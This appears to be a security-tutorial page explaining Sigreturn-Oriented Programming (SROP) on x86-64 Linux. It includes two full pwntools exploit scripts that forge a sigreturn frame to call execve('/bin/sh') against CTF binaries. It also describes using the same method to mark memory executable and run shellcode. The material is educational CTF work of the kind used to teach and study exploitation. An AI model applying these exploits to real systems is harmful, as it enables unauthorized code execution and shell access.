## Basic Information

**`Sigreturn`** is a special **syscall** that's primarily used to clean up after a signal handler has completed its execution. Signals are interruptions sent to a program by the operating system, often to indicate that some exceptional situation has occurred. When a program receives a signal, it temporarily pauses its current work to handle the signal with a **signal handler**, a special function designed to deal with signals.

After the signal handler finishes, the program needs to **resume its previous state** as if nothing happened. This is where **`sigreturn`** comes into play. It helps the program to **return from the signal handler** and restores the program's state by cleaning up the stack frame (the section of memory that stores function calls and local variables) that was used by the signal handler.

The interesting part is how **`sigreturn`** restores the program's state: it does so by storing **all the CPU's register values on the stack.** When the signal is no longer blocked, **`sigreturn` pops these values off the stack**, effectively resetting the CPU's registers to their state before the signal was handled. This includes the stack pointer register (RSP), which points to the current top of the stack.

{% hint style="danger" %}
Calling the syscall **`sigreturn`** from a ROP chain and **adding the registry values** we would like it to load in the **stack** it's possible to **control** all the register values and therefore **call** for example the syscall `execve` with `/bin/sh`.
{% endhint %}

Note how this would be a **type of Ret2syscall** that makes much easier to control params to call other Ret2syscalls:

{% content-ref url="../rop-syscall-execv/" %}
[rop-syscall-execv](../rop-syscall-execv/)
{% endcontent-ref %}

If you are curious this is the **sigcontext structure** stored in the stack to later recover the values (diagram from [**here**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)):

## Example

You can [**find an example here**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) where the call to signeturn is constructed via ROP (putting in rxa the value `0xf`), although this is the final exploit from there:

```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```

Check also the [**exploit from here**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html) where the binary was already calling `sigreturn` and therefore it's not needed to build that with a **ROP**:

```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```

  * 64 bits assembly program, no relro, no canary, nx, no pie. The flow allows to write in the stack, control several registers, and call a syscall and then it calls `exit`. The selected syscall is a `sigreturn` that will set registries and move `eip` to call a previous syscall instruction and run `memprotect` to set the binary space to `rwx` and set the ESP in the binary space. Following the flow, the program will call read intro ESP again, but in this case ESP will be pointing to the next intruction so passing a shellcode will write it as the next instruction and execute it.

  * SROP is used to give execution privileges (memprotect) to the place where a shellcode was placed.
